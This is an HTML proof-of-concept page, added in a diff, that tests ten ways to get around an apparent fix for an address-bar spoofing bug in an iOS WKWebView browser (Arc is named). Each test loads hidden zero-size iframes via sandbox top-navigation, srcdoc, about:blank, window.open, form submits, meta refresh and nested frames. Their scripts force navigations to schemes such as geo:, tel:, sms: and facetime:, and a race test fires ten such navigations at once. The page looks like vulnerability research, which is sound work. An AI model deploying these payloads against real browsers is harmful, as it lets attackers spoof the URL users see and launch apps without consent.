@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome - My Page</title>
+  <style>
+    body { font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 24px; background: #fff; }
+    h1 { font-size: 22px; margin-bottom: 12px; }
+    p { color: #555; line-height: 1.6; }
+    .btn {
+      display: block; width: 100%; padding: 14px; margin: 8px 0;
+      background: #007aff; color: #fff; border: none; border-radius: 10px;
+      font-size: 16px; cursor: pointer; text-align: center;
+    }
+    .section { margin: 20px 0; padding: 16px; background: #f5f5f7; border-radius: 12px; }
+    .section h3 { font-size: 14px; color: #888; margin-bottom: 8px; }
+    .result { font-size: 13px; color: #333; font-family: monospace; padding: 4px; }
+    .success { color: #34c759; font-weight: bold; }
+    .fail { color: #999; }
+  </style>
+</head>
+<body>
+
+<h1>Address Bar Spoof - Bypass Tester</h1>
+<p>This page stays visible. Each test loads a hidden iframe that attempts to change
+the address bar. Watch the URL bar after pressing each button.</p>
+
+<div class="section">
+  <h3>Bypass 1 — sandbox + allow-top-navigation</h3>
+  <p style="font-size:12px;color:#888;">The iframe has permission to navigate the TOP frame.
+  When it fires <code>top.location = "geo:0,0"</code>, WKNavigationDelegate sees it as a main frame
+  navigation (isMainFrame=true), but the initiator is the iframe's origin.</p>
+  <button class="btn" onclick="runTest('payload-sandbox-top.html')">Test Sandbox + Top Nav</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 2 — srcdoc origin confusion</h3>
+  <p style="font-size:12px;color:#888;">An iframe with <code>srcdoc</code> has origin "about:srcdoc".
+  When it navigates to geo:, the delegate might not find a proper origin and fall back incorrectly.</p>
+  <button class="btn" onclick="runTest(null, 'srcdoc')">Test srcdoc Iframe</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 3 — window.open() from iframe</h3>
+  <p style="font-size:12px;color:#888;"><code>window.open("geo:0,0")</code> from inside an iframe
+  goes through a different WKWebView delegate method (<code>createWebViewWith</code>) than
+  normal navigation. The isMainFrame check might not exist on this path.</p>
+  <button class="btn" onclick="runTest('payload-window-open.html')">Test window.open()</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 4 — form submission to scheme</h3>
+  <p style="font-size:12px;color:#888;">Form submissions have <code>navigationType = .formSubmitted</code>
+  which is a different type than link clicks. The fix might only check isMainFrame for
+  <code>.other</code> or <code>.linkActivated</code> types.</p>
+  <button class="btn" onclick="runTest('payload-form-submit.html')">Test Form Submit</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 5 — Alternative URI schemes</h3>
+  <p style="font-size:12px;color:#888;">If Arc blocklisted geo:/tel:/sms:, these alternative
+  iOS schemes might bypass the blocklist while still triggering the delegate bug.</p>
+  <button class="btn" onclick="runTest('payload-alt-schemes.html')">Test Alt Schemes</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 6 — Nested iframe chain</h3>
+  <p style="font-size:12px;color:#888;">Iframe A contains Iframe B. Iframe B navigates.
+  The frame hierarchy check might misidentify which frame is "main" in a nested context.</p>
+  <button class="btn" onclick="runTest('payload-nested.html')">Test Nested Iframes</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 7 — about:blank inherit + scheme</h3>
+  <p style="font-size:12px;color:#888;">An about:blank iframe inherits the parent's origin.
+  Navigation from it might pass isMainFrame checks since it shares the parent's security context.</p>
+  <button class="btn" onclick="runTest(null, 'aboutblank')">Test about:blank Iframe</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 8 — Rapid-fire race condition</h3>
+  <p style="font-size:12px;color:#888;">Fire 10 different scheme navigations in rapid succession
+  from multiple iframes. The delegate might race and update the bar before the isMainFrame check
+  completes on all of them.</p>
+  <button class="btn" onclick="runRace()">Test Race Condition</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 9 — anchor target=_top</h3>
+  <p style="font-size:12px;color:#888;">Anchor click with target=_top causes the top frame to navigate,
+  but the click event originates from the iframe. The navigation action's sourceFrame vs targetFrame
+  might confuse the delegate.</p>
+  <button class="btn" onclick="runTest('payload-anchor-top.html')">Test Anchor _top</button>
+</div>
+
+<div class="section">
+  <h3>Bypass 10 — meta refresh from iframe to top</h3>
+  <p style="font-size:12px;color:#888;">Meta refresh triggers navigation through a timer, not
+  through user action or JS. This goes through <code>decidePolicyFor</code> with
+  <code>navigationType = .other</code> which might have a different code path.</p>
+  <button class="btn" onclick="runTest('payload-meta-refresh.html')">Test Meta Refresh</button>
+</div>
+
+<div id="iframe-container" style="position:absolute;width:0;height:0;overflow:hidden;"></div>
+
+<div id="log" style="margin-top:20px;padding:12px;background:#f0f0f0;border-radius:8px;font-family:monospace;font-size:11px;max-height:200px;overflow-y:auto;display:none;"></div>
+
+<script>
+// Change this to your GitHub Pages base URL
+const BASE = '';  // relative paths work if all files are in same directory
+
+function log(msg) {
+  const el = document.getElementById('log');
+  el.style.display = 'block';
+  el.innerHTML += msg + '<br>';
+  el.scrollTop = el.scrollHeight;
+}
+
+function clearIframes() {
+  document.getElementById('iframe-container').innerHTML = '';
+}
+
+function runTest(file, special) {
+  clearIframes();
+  const container = document.getElementById('iframe-container');
+
+  if (special === 'srcdoc') {
+    // Bypass 2: srcdoc iframe
+    const iframe = document.createElement('iframe');
+    iframe.srcdoc = `
+      <html><body><script>
+        // srcdoc has origin about:srcdoc
+        // Try navigating to geo: from this context
+        setTimeout(function() {
+          try { window.location.href = "geo:0,0"; } catch(e) {}
+        }, 100);
+        setTimeout(function() {
+          try { top.location.href = "geo:0,0"; } catch(e) {}
+        }, 300);
+        setTimeout(function() {
+          try { window.open("geo:0,0"); } catch(e) {}
+        }, 500);
+      <\/script></body></html>
+    `;
+    iframe.width = '0';
+    iframe.height = '0';
+    iframe.style.border = 'none';
+    iframe.sandbox = 'allow-scripts allow-top-navigation';
+    container.appendChild(iframe);
+    log('[srcdoc] Loaded srcdoc iframe with geo: attempts');
+    return;
+  }
+
+  if (special === 'aboutblank') {
+    // Bypass 7: about:blank iframe
+    const iframe = document.createElement('iframe');
+    iframe.src = 'about:blank';
+    iframe.width = '0';
+    iframe.height = '0';
+    iframe.style.border = 'none';
+    container.appendChild(iframe);
+
+    iframe.onload = () => {
+      try {
+        const doc = iframe.contentDocument;
+        doc.open();
+        doc.write(`<html><body><script>
+          setTimeout(function() { window.location.href = "geo:0,0"; }, 100);
+          setTimeout(function() { top.location.href = "geo:0,0"; }, 300);
+          setTimeout(function() { window.open("geo:0,0"); }, 500);
+        <\/script></body></html>`);
+        doc.close();
+        log('[about:blank] Wrote to about:blank iframe, firing scheme navs');
+      } catch(e) {
+        log('[about:blank] Error: ' + e.message);
+      }
+    };
+    return;
+  }
+
+  // Standard file-based payload
+  const iframe = document.createElement('iframe');
+  iframe.src = BASE + file;
+  iframe.width = '0';
+  iframe.height = '0';
+  iframe.style.border = 'none';
+  if (file.includes('sandbox')) {
+    iframe.sandbox = 'allow-scripts allow-top-navigation allow-top-navigation-by-user-activation';
+  }
+  container.appendChild(iframe);
+  log('[' + file + '] Loaded');
+}
+
+function runRace() {
+  clearIframes();
+  const container = document.getElementById('iframe-container');
+  const schemes = [
+    'geo:0,0', 'tel:+1234567890', 'sms:+1234567890',
+    'mailto:x@x.com', 'maps:0,0', 'calshow:',
+    'facetime:x@x.com', 'facetime-audio:x@x.com',
+    'shortcuts://', 'itms-apps://',
+  ];
+
+  // Fire 10 iframes simultaneously, each with a different scheme
+  schemes.forEach((scheme, i) => {
+    const iframe = document.createElement('iframe');
+    iframe.srcdoc = `<html><body><script>
+      setTimeout(function() {
+        window.location.href = "${scheme}";
+      }, ${i * 20});
+    <\/script></body></html>`;
+    iframe.width = '0';
+    iframe.height = '0';
+    iframe.style.border = 'none';
+    iframe.sandbox = 'allow-scripts allow-top-navigation';
+    container.appendChild(iframe);
+  });
+  log('[race] Fired ' + schemes.length + ' scheme navigations in rapid succession');
+}
+</script>
+</body>
+</html>
